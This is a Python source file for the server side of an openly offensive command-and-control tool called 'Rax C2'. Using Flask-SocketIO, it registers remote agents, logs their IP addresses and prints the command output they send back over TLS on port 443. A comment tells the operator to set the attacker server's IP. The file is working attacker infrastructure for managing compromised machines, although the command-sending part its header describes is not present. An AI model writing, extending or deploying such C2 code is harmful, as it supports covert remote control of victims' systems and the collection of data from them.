# === server.py ===
# This is the main server component for Rax C2.
# It uses Flask + Flask-SocketIO to handle agent connections, command distribution, and result collection.

from flask import Flask, request  # Flask for HTTP routes
from flask_socketio import SocketIO, emit  # SocketIO for real-time communication with agents
import pyfiglet

# --- ASCII Banner ---
# Banner for a Rax C2 Server file
ascii_banner = pyfiglet.figlet_format("Rax - C2 - Server")
print(ascii_banner)
print("By - @mello-io")
print("-" * 30) # Separator for readability

app = Flask(__name__)
socketio = SocketIO(app)  # Create a SocketIO server

agents = {}  # Dictionary to keep track of agents (agent_id : IP)

@app.route('/register', methods=['POST'])
def register():
    # Called when an agent sends a POST request to register
    ip = request.remote_addr
    agent_id = request.json.get("id")
    agents[agent_id] = ip
    print(f"[+] Agent {agent_id} registered from {ip}")
    return {"status": "registered"}

@socketio.on('exec_result')
def handle_result(data):
    # Handle incoming command output from the agent
    print(f"[{data['id']}] Output:\n{data['output']}")

@socketio.on('connect')
def connect():
    # Called when an agent connects
    print("[+] Agent connected.")

if __name__ == "__main__":
    # Start the SocketIO server with SSL support
    # Make sure cert.pem and key.pem are in the same folder
    # Change the 0.0.0.0 to the IP of the attacker server
    socketio.run(app, host='0.0.0.0', port=443, ssl_context=('cert.pem', 'key.pem'))
